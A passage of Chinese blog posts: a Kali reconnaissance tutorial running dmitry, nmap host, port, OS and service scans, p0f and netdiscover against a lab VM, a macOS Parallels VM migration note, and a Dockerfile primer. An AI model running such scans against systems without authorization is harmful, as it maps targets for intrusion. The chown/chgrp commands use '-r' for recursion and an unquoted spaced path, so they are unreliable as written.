href="#2-测试网络范围" class="headerlink" title="2. 测试网络范围"></a>2. 测试网络范围</h2><h3 id="2-1-域名查询工具DMitry"><a href="#2-1-域名查询工具DMitry" class="headerlink" title="2.1 域名查询工具DMitry"></a>2.1 域名查询工具<code>DMitry</code></h3><p><code>DMitry</code>工具是用来<strong>查询IP或域名WHOIS信息</strong>的。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; dmitry -winsepo rzchina.netDeepmagic Information Gathering Tool&quot;There be some deep magic going on&quot;Writing output to &#39;rzchina.net.txt&#39;HostIP:180.178.61.83HostName:rzchina.net······Gathered Inic-whois information for rzchina.net---------------------------------   Domain Name: RZCHINA.NET   Registry Domain ID: 965877923_DOMAIN_NET-VRSN   Registrar WHOIS Server: whois.bizcn.com   Registrar URL: http:&#x2F;&#x2F;www.bizcn.com   Updated Date: 2020-05-10T07:17:45Z   Creation Date: 2007-05-09T10:08:08Z   Registry Expiry Date: 2021-05-09T10:08:08Z   Registrar: Bizcn.com, Inc.   Registrar IANA ID: 471   Registrar Abuse Contact Email:   Registrar Abuse Contact Phone:   Domain Status: clientDeleteProhibited https:&#x2F;&#x2F;icann.org&#x2F;epp#clientDeleteProhibited   Domain Status: clientTransferProhibited https:&#x2F;&#x2F;icann.org&#x2F;epp#clientTransferProhibited   Name Server: DNS1.BIZMOTO.COM   Name Server: DNS2.BIZMOTO.COM   DNSSEC: unsigned   URL of the ICANN Whois Inaccuracy Complaint Form: https:&#x2F;&#x2F;www.icann.org&#x2F;wicf&#x2F;&gt;&gt;&gt; Last update of whois database: 2021-03-29T13:11:07Z &lt;&lt;&lt;······</code></pre></div><h3 id="2-2-跟踪路由工具Scapy"><a href="#2-2-跟踪路由工具Scapy" class="headerlink" title="2.2 跟踪路由工具Scapy"></a>2.2 跟踪路由工具<code>Scapy</code></h3><p><code>Scapy</code>是一款强大的交互式数据包处理工具、数据包生成器、网络扫描器、网络发现工具和包嗅探工具。它提供多种类别的交互式生成数据包或数据包集合、对数据包进行操作、发送数据包、包嗅探、应答和反馈匹配等功能。</p><blockquote><p>内容较多。</p></blockquote><h2 id="3-nmap"><a href="#3-nmap" class="headerlink" title="3. nmap"></a>3. <code>nmap</code></h2><p><code>nmap</code>(network mapper)是一个用于网络发现和安全审计的免费开放源码(许可证)工具。</p><p>可用于<strong>主机发现，端口扫描，服务发现，操作系统</strong>。</p><h3 id="3-1-测试主机存活"><a href="#3-1-测试主机存活" class="headerlink" title="3.1 测试主机存活"></a>3.1 测试主机存活</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sP 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:22 CSTNmap scan report for 192.168.205.3Host is up (0.00037s latency).MAC Address: 00:0C:29:75:81:24 (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds</code></pre></div><h3 id="3-2-查看打开端口"><a href="#3-2-查看打开端口" class="headerlink" title="3.2 查看打开端口"></a>3.2 查看打开端口</h3><p>直接传入ip地址即为扫描端口。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:26 CSTNmap scan report for 192.168.205.3Host is up (0.0011s latency).Not shown: 993 filtered portsPORT      STATE SERVICE135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn445&#x2F;tcp   open  microsoft-ds49153&#x2F;tcp open  unknown49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknownMAC Address: 00:0C:29:75:81:24 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.06 seconds</code></pre></div><p><code>-v</code> ：显示详细的扫描信息    </p><p><code>-sS</code> ：扫描方式-sS是使用SYN半开式扫描，这种扫描方式使得扫描结果更加正确(又称半开放，或隐身扫描)  </p><p><code>-oN/-oX/-oS/-oG &lt;file&gt;</code>: 输出为文件normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.<br><code>-sS/sT/sA/sW/sM</code>: TCP SYN/Connect()/ACK/Window/Maimon scans<br><code>-sU</code>: UDP Scan<br><code>-sN/sF/sX</code>: TCP Null, FIN, and Xmas scans</p><p><code>-sI</code> &lt;zombie host[:probeport]&gt;: Idle scan </p><p><code>-sY/sZ</code>: SCTP INIT/COOKIE-ECHO scans </p><p><code>-sO</code>: IP protocol scan<br><code>-b</code> <FTP relay host>: FTP bounce scan</p><p><code>-p</code>：指定端口或端口范围 -p 80-445。</p><h3 id="3-3-系统指纹识别"><a href="#3-3-系统指纹识别" class="headerlink" title="3.3 系统指纹识别"></a>3.3 系统指纹识别</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -O 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:32 CSTNmap scan report for 192.168.205.3Host is up (0.00083s latency).Not shown: 993 filtered portsPORT      STATE SERVICE135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn445&#x2F;tcp   open  microsoft-ds49153&#x2F;tcp open  unknown49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknownMAC Address: 00:0C:29:75:81:24 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purpose|specialized|phoneRunning: Microsoft Windows 2008|8.1|7|Phone|VistaOS CPE: cpe:&#x2F;o:microsoft:windows_server_2008:r2 cpe:&#x2F;o:microsoft:windows_8.1 cpe:&#x2F;o:microsoft:windows_7::-:professional cpe:&#x2F;o:microsoft:windows_8 cpe:&#x2F;o:microsoft:windows_7 cpe:&#x2F;o:microsoft:windows cpe:&#x2F;o:microsoft:windows_vista::- cpe:&#x2F;o:microsoft:windows_vista::sp1OS details: Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008Network Distance: 1 hopOS detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds</code></pre></div><h4 id="指纹识别工具p0f"><a href="#指纹识别工具p0f" class="headerlink" title="指纹识别工具p0f"></a>指纹识别工具<code>p0f</code></h4><p>p0f是一款<strong>百分之百的<em>被动</em>指纹识别工具</strong>。该工具通过分析目标主机发出的数据包，对主机上的操作系统进行鉴别。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; p0f -r ~&#x2F;Desktop&#x2F;mac.pcapng -o result.log--- p0f 3.09b by Michal Zalewski &lt;lcamtuf@coredump.cx&gt; ---[+] Closed 1 file descriptor.[+] Loaded 322 signatures from &#39;&#x2F;etc&#x2F;p0f&#x2F;p0f.fp&#39;.[+] Will read pcap data from file &#39;&#x2F;root&#x2F;Desktop&#x2F;mac.pcapng&#39;.[+] Default packet filtering configured [+VLAN].[+] Log file &#39;result.log&#39; opened for writing.[+] Processing capture data..-[ 10.12.168.255&#x2F;55108 -&gt; 192.168.0.205&#x2F;59442 (syn) ]-|| client   &#x3D; 10.12.168.255&#x2F;55108| os       &#x3D; Mac OS X| dist     &#x3D; 0| params   &#x3D; generic fuzzy| raw_sig  &#x3D; 4:64+0:0:1460:65535,6:mss,nop,ws,nop,nop,ts,sok,eol+1:id-:0|&#96;----.-[ 10.12.168.255&#x2F;55108 -&gt; 192.168.0.205&#x2F;59442 (mtu) ]-|| client   &#x3D; 10.12.168.255&#x2F;55108| link     &#x3D; Ethernet or modem| raw_mtu  &#x3D; 1500|&#96;----All done. Processed 2535 packets.</code></pre></div><h3 id="3-4-服务指纹识别"><a href="#3-4-服务指纹识别" class="headerlink" title="3.4 服务指纹识别"></a>3.4 服务指纹识别</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sV 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:42 CSTNmap scan report for 192.168.205.3Host is up (0.00100s latency).Not shown: 993 filtered portsPORT      STATE SERVICE      VERSION135&#x2F;tcp   open  msrpc        Microsoft Windows RPC139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445&#x2F;tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)49153&#x2F;tcp open  msrpc        Microsoft Windows RPC49154&#x2F;tcp open  msrpc        Microsoft Windows RPC49155&#x2F;tcp open  msrpc        Microsoft Windows RPC49157&#x2F;tcp open  msrpc        Microsoft Windows RPCMAC Address: 00:0C:29:75:81:24 (VMware)Service Info: Host: WIN-96S87FOPGPF; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 71.62 seconds</code></pre></div><h3 id="3-5-其他"><a href="#3-5-其他" class="headerlink" title="3.5 其他"></a>3.5 其他</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sP 172.16.15.0&#x2F;24nmap -sP 172.16.15.*# 列出开放了指定端口的主机列表  nmap -sT -p 80 -oG – 192.168.1.* | grep open# 获取远程主机的系统类型及开放端口  nmap -A &lt;target&gt;# 这里的 &lt; target &gt; 可以是单一 IP，或主机名，或域名，或子网 </code></pre></div><h2 id="4-其他信息收集"><a href="#4-其他信息收集" class="headerlink" title="4. 其他信息收集"></a>4. 其他信息收集</h2><h3 id="4-1-ARP侦查工具Netdiscover"><a href="#4-1-ARP侦查工具Netdiscover" class="headerlink" title="4.1 ARP侦查工具Netdiscover"></a>4.1 ARP侦查工具<code>Netdiscover</code></h3><p><code>Netdiscover</code>是一个主动/被动的<strong>ARP侦查工具</strong>。使用<code>Netdiscover</code>工具可以在网络上扫描IP地址，检查在线主机或搜索为它们发送的ARP请求。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; netdiscover Currently scanning: 172.16.24.0&#x2F;16   |   Screen View: Unique Hosts 2 Captured ARP Req&#x2F;Rep packets, from 2 hosts.   Total size: 120 _____________________________________________________________________________   IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname ----------------------------------------------------------------------------- 192.168.205.1   e2:b5:5f:2f:91:64      1      60  Unknown vendor 192.168.205.6   00:0c:29:74:c6:08      1      60  VMware, Inc.</code></pre></div><h3 id="4-2-搜索引擎工具Shodan"><a href="#4-2-搜索引擎工具Shodan" class="headerlink" title="4.2 搜索引擎工具Shodan"></a>4.2 搜索引擎工具<code>Shodan</code></h3><p><a href="https://www.shodan.io/">Shodan</a>是互联网上最强大的一个搜索引擎工具。该工具不是在网上搜索网址，而是直接<strong>搜索服务器</strong>。</p><blockquote><p>参考：</p><p><a href="https://tools.kali.org/tools-listing">https://tools.kali.org/tools-listing</a></p><p><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Parallels虚拟机迁移问题记录</title>
    <link href="/posts/f99bebc2/"/>
    <url>/posts/f99bebc2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>之前使用Mac上的Parallels安装Windows 10时，默认选择了<code>/var/root/Parallels</code>路径存放虚拟机文件。</p><p>而其他虚拟机文件在<code>/Users/buddyholly/Parallels</code>下。整体管理不方便，故选择将Windows 10迁移到Users下。</p></blockquote><h3 id="问题一：Finder文件夹不显示隐藏文件"><a href="#问题一：Finder文件夹不显示隐藏文件" class="headerlink" title="问题一：Finder文件夹不显示隐藏文件"></a>问题一：<code>Finder</code>文件夹不显示隐藏文件</h3><p>使用命令使隐藏文件在<code>Finder</code>中显示</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.finder AppleShowAllFiles TRUE &amp;&amp; killall Finder</code></pre></div><p>若需要重新隐藏将<code>TRUE</code>写为<code>FALSE</code>即可。</p><p>为了省事可以写一个<code>alias</code>，使用<code>zsh</code>的话将以下内容写入<code>~/.zshrc</code>，立即生效需要<code>source</code>这个文件。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># aliasshowhidenfile&#x3D;&quot;defaults write com.apple.finder AppleShowAllFiles TRUE &amp;&amp; killall Finder&quot;notshowhidenfile&#x3D;&quot;defaults write com.apple.finder AppleShowAllFiles FALSE &amp;&amp; killall Finder&quot;</code></pre></div><h3 id="问题二：迁移Parallels虚拟机文件Windows-10-pvm"><a href="#问题二：迁移Parallels虚拟机文件Windows-10-pvm" class="headerlink" title="问题二：迁移Parallels虚拟机文件Windows 10.pvm"></a>问题二：迁移<code>Parallels</code>虚拟机文件<code>Windows 10.pvm</code></h3><p>我使用的方式是先克隆一个虚拟机，再将原虚拟机删除。</p><p>在<code>Parallels</code>中右键需要操作的虚拟机，选中<code>克隆</code>，可以选择克隆的目的路径与目标文件名（实际上pvm是个目录，包含了虚拟机所用的相关配置与文件）。我将了<code>/var/root/Parallels/Windows 10.pvm</code>克隆在了<code>/Users/buddyholly/Parallels/Windows 10.pvm</code>。</p><p>之后将<code>/var/root/Parallels/Windows 10.pvm</code>与<code>/var/root/Parallels/</code>下相关文件删除。这里我遇到了一个问题见<em>问题4</em>。</p><h3 id="问题三：克隆虚拟机的所有者与组"><a href="#问题三：克隆虚拟机的所有者与组" class="headerlink" title="问题三：克隆虚拟机的所有者与组"></a>问题三：克隆虚拟机的所有者与组</h3><p>因为原虚拟机文件在<code>/var/root</code>下，克隆至<code>/Users/buddyholly/Parallels/Windows 10.pvm</code>后仍为<code>root</code>的<code>own</code>与<code>group</code>。不变更的话操作不方便，而且显示新的pvm文件大小有误，但在电脑上肯定占用了空间。变更一下，变更后正常使用，文件大小显示正确。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 在&#x2F;Users&#x2F;buddyholly&#x2F;Parallels&#x2F;下进行# 两个操作都应选择递归-r，否则仍有错误sudo chown -r leex0 Windows 10.pvmsudo chgrp -r staff Windows 10.pvm</code></pre></div><h3 id="问题四：清理root下的-Trash"><a href="#问题四：清理root下的-Trash" class="headerlink" title="问题四：清理root下的.Trash"></a>问题四：清理root下的.Trash</h3><p>在解决<em>问题三</em>前，发现自己<strong>Mac的空间被其他类别占用很多</strong>，应该是虚拟机迁移的相关文件导致，搜了一下文件所在。发现<code>/var/root/.Trash</code>占用很大，应该是之前的操作不当导致垃圾箱有很多无用文件。</p><p>而在这里的垃圾文件不会被诸如CleanMyMac等软件扫描出来（可能是这些东西在/root下的原因）。手动删除一下<code>/var/root/.Trash</code>内的文件，再看Mac的存储空间，已经多出了应有的剩余空间。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>DNS</tag>
      
      <tag>Parallels</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——Dockerfile指令</title>
    <link href="/posts/8ef91b9d/"/>
    <url>/posts/8ef91b9d/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>FROM</code>与<code>RUN</code>命令不再介绍，见<a href="https://leex0.top/2021/03/24/Docker%E5%AE%9E%E8%B7%B5%E2%80%94%E2%80%94%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F/">链接</a>。</p></blockquote><h2 id="COPY复制文件"><a href="#COPY复制文件" class="headerlink" title="COPY复制文件"></a>COPY复制文件</h2><p>格式：</p><ul><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt;... &lt;目标路径&gt;</code></li><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code></li></ul><p>和 <code>RUN</code> 指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用。</p><p><code>COPY</code> 指令将从构建上下文目录中 <code>&lt;源路径&gt;</code> 的文件/目录复制到新的一层的镜像内的 <code>&lt;目标路径&gt;</code> 位置。比如：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY package.json &#x2F;usr&#x2F;src&#x2F;app&#x2F;</code></pre></div><p><code>&lt;源路径&gt;</code> 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 <a href="https://golang.org/pkg/path/filepath/#Match"><code>filepath.Match</code></a> 规则，如：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY hom* &#x2F;mydir&#x2F;COPY hom?.txt &#x2F;mydir&#x2F;</code></pre></div><p><code>&lt;目标路径&gt;</code> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 <code>WORKDIR</code> 指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。</p><p>此外，还需要注意一点，使用 <code>COPY</code> 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用。特别是构建相关文件都在使用 Git 进行管理的时候。</p><p>在使用该指令的时候还可以加上 <code>--chown=&lt;user&gt;:&lt;group&gt;</code> 选项来改变文件的所属用户及所属组。</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY --chown&#x3D;55:mygroup files* &#x2F;mydir&#x2F;COPY --chown&#x3D;bin files* &#x2F;mydir&#x2F;COPY --chown&#x3D;1 files* &#x2F;mydir&#x2F;COPY --chown&#x3D;10:11 files* &#x2F;mydir&#x2F;</code></pre></div><p>如果源路径为文件夹，复制的时候不是直接复制该文件夹，而是将文件夹中的内容复制到目标路径。</p><h2 id="ADD-更高级的复制文件"><a href="#ADD-更高级的复制文件" class="headerlink" title="ADD 更高级的复制文件"></a>ADD 更高级的复制文件</h2><blockquote><p><strong>结论：此在 <code>COPY</code> 和 <code>ADD</code> 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code>。</strong></p></blockquote><p><code>ADD</code> 指令和 <code>COPY</code> 的格式和性质基本一致。但是在 <code>COPY</code> 基础上增加了一些功能。</p><p>如果 <code>&lt;源路径&gt;</code> 为一个 <code>tar</code> 压缩文件的话，压缩格式为 <code>gzip</code>, <code>bzip2</code> 以及 <code>xz</code> 的情况下，<code>ADD</code> 指令将会自动解压缩这个压缩文件到 <code>&lt;目标路径&gt;</code> 去。</p><p>在某些情况下，这个自动解压缩的功能非常有用，比如官方镜像 <code>ubuntu</code> 中：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM scratchADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz &#x2F;...</code></pre></div><h2 id="CMD-容器启动命令"><a href="#CMD-容器启动命令" class="headerlink" title="CMD 容器启动命令"></a>CMD 容器启动命令</h2><p><code>CMD</code> 指令的格式和 <code>RUN</code> 相似，也是两种格式：</p><ul><li><code>shell</code> 格式：<code>CMD &lt;命令&gt;</code></li><li><code>exec</code> 格式：<code>CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]</code></li><li>参数列表格式：<code>CMD [&quot;参数1&quot;, &quot;参数2&quot;...]</code>。在指定了 <code>ENTRYPOINT</code> 指令后，用 <code>CMD</code> 指定具体的参数。</li></ul><p><strong>之前介绍容器的时候曾经说过，Docker 不是虚拟机，容器就是进程。既然是进程，那么在启动容器的时候，需要指定所运行的程序及参数。<code>CMD</code> 指令就是用于指定默认的容器主进程的启动命令的。</strong></p><p>在运行时可以指定新的命令来替代镜像设置中的这个默认命令，比如，<code>ubuntu</code> 镜像默认的 <code>CMD</code> 是 <code>/bin/bash</code>，如果我们直接 <code>docker run -it ubuntu</code> 的话，会直接进入 <code>bash</code>。我们也可以在运行时指定运行别的命令，如 <code>docker run -it ubuntu cat /etc/os-release</code>。这就是用 <code>cat /etc/os-release</code> 命令替换了默认的 <code>/bin/bash</code> 命令了，输出了系统版本信息。</p><p>在指令格式上，一般推荐使用 <code>exec</code> 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 <code>&quot;</code>，而不要使用单引号。</p><p>如果使用 <code>shell</code> 格式的话，实际的命令会被包装为 <code>sh -c</code> 的参数的形式进行执行。比如：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">CMD echo $HOME</code></pre></div><p>在实际执行中，会将其变更为：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;echo $HOME&quot; ]</code></pre></div><p>这就是为什么我们可以使用环境变量的原因，因为这些环境变量会被 shell 进行解析处理。</p><h1 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h1><p><code>ENTRYPOINT</code> 的格式和 <code>RUN</code> 指令格式一样，分为 <code>exec</code> 格式和 <code>shell</code> 格式。</p><p><code>exec</code>形式下<code>ENTRYPOINT</code>与<code>CMD</code>组成的完整命令：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">executable CMD</code></pre></div><p><code>shell</code>形式下<code>ENTRYPOINT</code>与<code>CMD</code>组成的完整命令（不建议使用）：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sh -c &quot;executable&quot; CMD</code></pre></div><p><code>ENTRYPOINT</code>作为目标入口。例：在<code>ubuntu</code>中默认的<code>ENTRYPOINT</code>其实就是<code>/bin/bash</code>。</p><p><code>ENTRYPOINT + CMD </code>加起来组成了容器起动时的指令。当我们想把目标镜像作为一个一次性运行的程序时，则在<code>ENTRYPOINT</code>中设置可执行命令，在<code>CMD</code>中设置参数。</p><p>比如有一个二进制的可执行文件square，需要一个参数，对其求平方值。那么我们可以打一个平方工具的镜像：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM baseImageADD square &#x2F;usr&#x2F;bin&#x2F;RUN chmod +x &#x2F;usr&#x2F;bin&#x2F;squareENTRYPOINT [&quot;&#x2F;usr&#x2F;bin&#x2F;square&quot;]CMD [&quot;2&quot;]</code></pre></div><p>那么，打出来镜像后（假设镜像名为squareImage:1.0），我们就可以这样使用镜像，这个命令会直接输出结果4，然后容器退出。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run squareImage:1.0</code></pre></div><p>当然，我们还可以在docker run的时候覆盖CMD，如下命令会直接输出结果9，然后容器退出。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run squareImage:1.0 3</code></pre></div><h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><h3 id="ENV-设置环境变量"><a href="#ENV-设置环境变量" class="headerlink" title="ENV 设置环境变量"></a>ENV 设置环境变量</h3><p>格式有两种：</p><ul><li><code>ENV &lt;key&gt; &lt;value&gt;</code></li><li><code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li></ul><p>这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 <code>RUN</code>，还是运行时的应用，都可以直接使用这里定义的环境变量。</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">ENV VERSION&#x3D;1.0 DEBUG&#x3D;on NAME&#x3D;&quot;Happy Feet&quot;</code></pre></div><h3 id="ARG-构建参数"><a href="#ARG-构建参数" class="headerlink" title="ARG 构建参数"></a>ARG 构建参数</h3><p>格式：<code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></p><p>构建参数和 <code>ENV</code> 的效果一样，都是设置环境变量。所不同的是，<code>ARG</code> 所设置的是<strong>构建环境的环境变量（参数）</strong>，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 <code>ARG</code> 保存密码之类的信息，因为 <code>docker history</code> 还是可以看到所有值的。</p><p><code>Dockerfile</code> 中的 <code>ARG</code> 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 <code>docker build</code> 中用 <code>--build-arg &lt;参数名&gt;=&lt;值&gt;</code> 来覆盖。</p><h3 id="VOLUME-定义匿名卷"><a href="#VOLUME-定义匿名卷" class="headerlink" title="VOLUME 定义匿名卷"></a>VOLUME 定义匿名卷</h3><p>格式为：</p><ul><li><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</code></li><li><code>VOLUME &lt;路径&gt;</code></li></ul><p>为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 <code>Dockerfile</code> 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">VOLUME &#x2F;data</code></pre></div><h3 id="EXPOSE-暴露端口"><a href="#EXPOSE-暴露端口" class="headerlink" title="EXPOSE 暴露端口"></a>EXPOSE 暴露端口</h3><p>格式为 <code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code>。</p><p><code>EXPOSE</code> 指令是声明容器运行时提供服务的端口，这只是一个声明，在容器运行时并不会因为这个声明应用就会开启这个端口的服务。</p><h3 id="WORKDIR-指定工作目录"><a href="#WORKDIR-指定工作目录" class="headerlink" title="WORKDIR 指定工作目录"></a>WORKDIR 指定工作目录</h3><p>格式为 <code>WORKDIR &lt;工作目录路径&gt;</code>。</p><p>使用 <code>WORKDIR</code> 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，<code>WORKDIR</code> 会帮你建立目录。类似于<code>Dockerfile</code>中的<code>cd</code>指令。</p><blockquote><p>一些初学者常犯的错误是把 <code>Dockerfile</code> 等同于 Shell 脚本来书写，这种错误的理解还可能会导致出现下面这样的错误：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN cd &#x2F;appRUN echo &quot;hello&quot; &gt; world.txt</code></pre></div><p>如果将这个 <code>Dockerfile</code> 进行构建镜像运行后，会发现找不到 <code>/app/world.txt</code> 文件，或者其内容不是 <code>hello</code>。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 <code>Dockerfile</code> 中，这两行 <code>RUN</code> 命令的执行环境根本不同，是两个完全不同的容器。这就是对 <code>Dockerfile</code> 构建分层存储的概念不了解所导致的错误。</p><p>之前说过每一个 <code>RUN</code> 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 <code>RUN cd /app</code> 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。</p></blockquote><h3 id="USER-指定当前用户"><a href="#USER-指定当前用户" class="headerlink" title="USER 指定当前用户"></a>USER 指定当前用户</h3><p>格式：<code>USER &lt;用户名&gt;[:&lt;用户组&gt;]</code></p><p><code>USER</code> 是改变之后层的执行 <code>RUN</code>, <code>CMD</code> 以及 <code>ENTRYPOINT</code> 这类命令的身份。注意，<code>USER</code> 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。</p><h2 id="容器中应用前台执行与后台执行问题"><a href="#容器中应用前台执行与后台执行问题" class="headerlink" title="# 容器中应用前台执行与后台执行问题"></a># 容器中应用前台执行与后台执行问题</h2><blockquote><p>注：区别与容器在<code>docker</code>中的前后台运行（<code>docker run -d</code>），是两码事。本处指容器中的应用在容器中前后台运行问题。</p><p><strong>结论：</strong></p><p><strong>容器必须要一个前台进程并且作为<code>pid=1</code>的主进程。（大概等于bash必须始终在占用）</strong></p><p><strong>容器会随着<code>pid=1</code>进程的结束而结束。</strong></p></blockquote><h3 id="情景一"><a href="#情景一" class="headerlink" title="情景一"></a>情景一</h3><blockquote><p>默认<code>nginx</code>镜像启动容器，或<code>FROM nginx</code>但未指定<code>CMD</code>。</p></blockquote><p><code>nginx</code>应用会正常启动并运行在后台，原因是<code>nginx</code>默认镜像中<code>CMD</code>为前台运行：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile"># docker-nginx&#x2F;Dockerfile-alpine.template···CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;]</code></pre></div><h3 id="情景二"><a href="#情景二" class="headerlink" title="情景二"></a>情景二</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxCMD [&quot;nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;]</code></pre></div></blockquote><p><code>nginx</code>应用会正常启动并运行在后台，且<code>nginx</code>会作为<code>pid=1</code>进程。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UID         PID   PPID  C STIME 